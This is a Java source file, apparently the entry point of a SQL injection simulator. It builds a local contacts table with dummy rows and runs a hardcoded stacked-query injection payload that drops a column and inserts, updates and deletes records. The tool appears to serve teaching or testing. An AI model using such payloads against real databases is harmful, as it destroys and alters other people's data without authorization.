package main;

import java.sql.PreparedStatement;

import server.ServerInstantiator;
import connection.DatabaseConnectionManager;

public class Start 
{
	private static DatabaseConnectionManager manager;
	private static boolean buildSchema = false;
	
	/**
	 * This is the main entry point.  Set your payload and run this,
	 * and the rest will be taken care of automagically.
	 * 
	 * @param args
	 */
	public static void main(String [] args)
	{
		ServerInstantiator.startServer();
		manager = new DatabaseConnectionManager();
		manager.connect();

		if(buildSchema)
			doSetup();
		
		System.out.println("Connected.");

		//Insert SQL injection here.
		String payload = "505 123 4567'; ALTER TABLE contacts DROP COLUMN phone; SELECT * FROM contacts WHERE '342 234 2342' IN (SELECT phone FROM contacts); INSERT INTO contacts VALUES('olol', 'bob@loblaw.com', '505 123 4567'); UPDATE contacts SET phone = '666 666 6666' WHERE name = 'sei-tan'; DELETE FROM contacts WHERE name = 'sei-tan'; SELECT * FROM contacts WHERE phone = '505 123 4567";
		new InjectionSimulator(manager).run(payload);
	}
	
	//This defines the schema for the one table in the DB right now and also 
	//inserts some records, too.
	public static void doSetup()
	{
		String clear = "DROP TABLE contacts;"; //Might fail but the rest works.
		PreparedStatement statement = manager.getPreparedStatement(clear);
		manager.executeStatement(statement);
		
		String table1 = "CREATE TABLE contacts (name VARCHAR(45),email VARCHAR(45),phone VARCHAR(45), PRIMARY KEY(name));";
		statement = manager.getPreparedStatement(table1);
		manager.executeStatement(statement);
		
		String dummyInsert = "INSERT INTO contacts VALUES('bob', 'bob@loblaw.com', '505 123 4567');";
		statement = manager.getPreparedStatement(dummyInsert);
		manager.executeStatement(statement);
		
		dummyInsert = "INSERT INTO contacts VALUES('bob2', 'bob@loblaw.com', '505 123 4567');";
		statement = manager.getPreparedStatement(dummyInsert);
		manager.executeStatement(statement);
		
		dummyInsert = "INSERT INTO contacts VALUES('bob3', 'bob@loblaw.com', '505 123 4567');";
		statement = manager.getPreparedStatement(dummyInsert);
		manager.executeStatement(statement);
		
		dummyInsert = "INSERT INTO contacts VALUES('bob4', 'bob@loblaw.com', '505 123 4567');";
		statement = manager.getPreparedStatement(dummyInsert);
		manager.executeStatement(statement);
	}
}
